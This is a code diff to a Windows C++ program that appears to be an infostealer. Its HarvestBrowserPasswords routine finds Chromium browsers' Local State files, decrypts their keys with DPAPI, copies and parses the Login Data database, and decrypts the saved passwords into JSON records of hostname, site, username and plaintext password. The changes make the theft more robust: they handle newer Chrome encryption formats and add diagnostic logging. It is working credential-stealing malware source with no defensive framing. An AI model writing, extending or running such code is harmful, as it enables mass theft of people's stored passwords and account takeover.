@@ -950,8 +950,8 @@ static int SqliteFindTableRoot(const uint8_t* db, size_t dbSize, uint16_t pageSi
     return ctx.root;
 }
  
-static bool ChromeDecryptPassword(const uint8_t* key, int keyLen, const uint8_t* blob, int blobLen, std::string& out) {
-    if (blobLen < 15 || blob[0] != 'v' || blob[1] != '1' || blob[2] != '0') return false;
+static bool ChromeDecryptPassword(const uint8_t* key, int keyLen, const uint8_t* blob, int blobLen, const char* browser, const std::string& originUrl, std::string& out) {
+    if (blobLen < 15 || blob[0] != 'v' || blob[1] != '1' || (blob[2] != '0' && blob[2] != '1')) { LogMsg(std::string(browser) + ": unsupported prefix '" + std::string((const char*)blob, blobLen > 3 ? 3 : blobLen) + "'"); return false; }
     const uint8_t* nonce = blob + 3;
     const uint8_t* ct = blob + 15;
     int ctLen = blobLen - 15 - 16;
@@ -970,7 +970,29 @@ static bool ChromeDecryptPassword(const uint8_t* key, int keyLen, const uint8_t*
     ai.pbNonce = (PUCHAR)nonce; ai.cbNonce = 12; ai.pbTag = (PUCHAR)tag; ai.cbTag = 16;
 
     out.resize(ctLen + 32);
-    if (SUCCEEDED(BCryptDecrypt(hKey, (PUCHAR)ct, ctLen, &ai, NULL, 0, (PUCHAR)out.data(), (ULONG)out.size(), &ol, 0))) { out.resize(ol); ok = true; }
+    if (SUCCEEDED(BCryptDecrypt(hKey, (PUCHAR)ct, ctLen, &ai, NULL, 0, (PUCHAR)out.data(), (ULONG)out.size(), &ol, 0))) {
+        out.resize(ol);
+        // Chrome 130+ (DB version 24+) prepends SHA256(origin_url) before encryption — strip it
+        if (ol >= 32 && !originUrl.empty()) {
+            BCRYPT_ALG_HANDLE hHash = NULL;
+            BCRYPT_HASH_HANDLE hHashObj = NULL;
+            DWORD hashLen = 0, tmp = 0;
+            uint8_t expectedHash[32];
+            if (SUCCEEDED(BCryptOpenAlgorithmProvider(&hHash, BCRYPT_SHA256_ALGORITHM, NULL, 0)) &&
+                SUCCEEDED(BCryptGetProperty(hHash, BCRYPT_HASH_LENGTH, (PUCHAR)&hashLen, sizeof(hashLen), &tmp, 0)) &&
+                hashLen == 32 &&
+                SUCCEEDED(BCryptCreateHash(hHash, &hHashObj, NULL, 0, NULL, 0, 0)) &&
+                SUCCEEDED(BCryptHashData(hHashObj, (PUCHAR)originUrl.c_str(), (ULONG)originUrl.size(), 0)) &&
+                SUCCEEDED(BCryptFinishHash(hHashObj, expectedHash, 32, 0)) &&
+                memcmp(out.data(), expectedHash, 32) == 0) {
+                out.erase(0, 32);
+                LogMsg(std::string(browser) + ": stripped SHA256 hash prefix");
+            }
+            if (hHashObj) BCryptDestroyHash(hHashObj);
+            if (hHash) BCryptCloseAlgorithmProvider(hHash, 0);
+        }
+        ok = true;
+    }
 done:
     if (hKey) BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
     return ok;
@@ -992,51 +1014,53 @@ static void HarvestBrowserPasswords() {
     std::string la(laBuf);
  
     for (int b = 0; kChromeBrowsers[b].name; b++) {
+        std::string bName(kChromeBrowsers[b].name);
         // Read + decrypt AES key from Local State
         std::string lsPath = la + kChromeBrowsers[b].ls;
         HANDLE hLs = CreateFileA(lsPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-        if (hLs == INVALID_HANDLE_VALUE) continue;
+        if (hLs == INVALID_HANDLE_VALUE) { LogMsg(bName + ": Local State not found"); continue; }
         DWORD lsSize = GetFileSize(hLs, NULL);
-        if (lsSize > 65536) { CloseHandle(hLs); continue; }
+        if (lsSize > 65536) { CloseHandle(hLs); LogMsg(bName + ": Local State too large"); continue; }
         std::string lsContent((size_t)lsSize, 0);
         DWORD rd = 0;
-        if (!ReadFile(hLs, &lsContent[0], lsSize, &rd, NULL) || rd != lsSize) { CloseHandle(hLs); continue; }
+        if (!ReadFile(hLs, &lsContent[0], lsSize, &rd, NULL) || rd != lsSize) { CloseHandle(hLs); LogMsg(bName + ": Local State read failed"); continue; }
         CloseHandle(hLs);
- 
+
         std::string encKeyStr = ExtractJSONString(lsContent, "encrypted_key");
-        if (encKeyStr.empty()) continue;
- 
+        if (encKeyStr.empty()) { LogMsg(bName + ": encrypted_key not found in Local State"); continue; }
+
         // Base64 decode encrypted_key
         DWORD decLen = (DWORD)encKeyStr.size() * 3 / 4 + 16;
         std::vector<uint8_t> dec(decLen);
-        if (!CryptStringToBinaryA(encKeyStr.c_str(), (DWORD)encKeyStr.size(), CRYPT_STRING_BASE64, dec.data(), &decLen, NULL, NULL)) continue;
-        if (decLen <= 5) continue;
- 
+        if (!CryptStringToBinaryA(encKeyStr.c_str(), (DWORD)encKeyStr.size(), CRYPT_STRING_BASE64, dec.data(), &decLen, NULL, NULL)) { LogMsg(bName + ": base64 decode failed"); continue; }
+        if (decLen <= 5) { LogMsg(bName + ": decrypted key too short"); continue; }
+
         // DPAPI decrypt to get AES key
         DATA_BLOB inBlob = { decLen - 5, dec.data() + 5 };
         DATA_BLOB outBlob = { 0, NULL };
-        if (!CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) continue;
- 
+        if (!CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) { LogMsg(bName + ": DPAPI decrypt failed"); continue; }
+
         uint8_t aesKey[32];
         int keyLen = outBlob.cbData < 32 ? (int)outBlob.cbData : 32;
         memcpy(aesKey, outBlob.pbData, keyLen);
         LocalFree(outBlob.pbData);
-        if (keyLen != 32) { LogMsg(std::string(kChromeBrowsers[b].name) + ": unexpected key length " + std::to_string(keyLen)); continue; }
- 
+        if (keyLen != 32) { LogMsg(bName + ": unexpected key length " + std::to_string(keyLen)); continue; }
+
         // Copy Login Data to temp
         std::string ldPath = la + kChromeBrowsers[b].ld;
         char tmpDir[MAX_PATH]; GetTempPathA(MAX_PATH, tmpDir);
         std::string tmpLd = std::string(tmpDir) + "NPLD_" + std::to_string(GetTickCount()) + ".tmp";
-        if (!CopyFileA(ldPath.c_str(), tmpLd.c_str(), FALSE)) { continue; }
- 
+        if (!CopyFileA(ldPath.c_str(), tmpLd.c_str(), FALSE)) { LogMsg(bName + ": Login Data copy failed"); continue; }
+
         HANDLE hF = CreateFileA(tmpLd.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
         HANDLE hM = NULL; const uint8_t* dbMap = NULL; size_t dbSz = 0;
         if (hF != INVALID_HANDLE_VALUE) { dbSz = GetFileSize(hF, NULL); if (dbSz > 100) { hM = CreateFileMapping(hF, NULL, PAGE_READONLY, 0, 0, NULL); if (hM) dbMap = (const uint8_t*)MapViewOfFile(hM, FILE_MAP_READ, 0, 0, 0); } }
-        if (!dbMap) { if (hF) CloseHandle(hF); DeleteFileA(tmpLd.c_str()); continue; }
- 
+        if (!dbMap) { if (hF) CloseHandle(hF); DeleteFileA(tmpLd.c_str()); LogMsg(bName + ": Login Data map failed"); continue; }
+
         int psInt = SqliteU16(dbMap + 16); if (psInt == 1) psInt = 65536; if (psInt < 512) psInt = 512; uint16_t ps = (uint16_t)psInt;
- 
+
         int rootP = SqliteFindTableRoot(dbMap, dbSz, ps, "logins");
+        if (rootP <= 0) { LogMsg(bName + ": logins table not found"); }
         if (rootP > 0) {
             struct HCtx { const uint8_t* db; size_t dbSz; uint16_t ps; uint8_t* ak; int kl; const char* bn; const char* hn; std::string batch; bool first; int count; };
             HCtx hc = { dbMap, dbSz, ps, aesKey, 32, kChromeBrowsers[b].name, g_hostname.c_str(), "[", true, 0 };
@@ -1056,7 +1080,7 @@ static void HarvestBrowserPasswords() {
                 if (!pwD || pwL <= 15) return true;
  
                 std::string pwd;
-                if (!ChromeDecryptPassword(h->ak, h->kl, pwD, pwL, pwd) || pwd.empty()) return true;
+                if (!ChromeDecryptPassword(h->ak, h->kl, pwD, pwL, h->bn, url, pwd) || pwd.empty()) return true;
  
                 std::string row = std::string(h->first ? "" : ",") + "{\"hostname\":\"" + EscapeJSON(h->hn) + "\",\"browser\":\"" + EscapeJSON(h->bn) + "\",\"origin_url\":\"" + EscapeJSON(url) + "\",\"username_value\":\"" + EscapeJSON(usr) + "\",\"password_value\":\"" + EscapeJSON(pwd) + "\"}";
                 h->batch += row; h->first = false; h->count++;
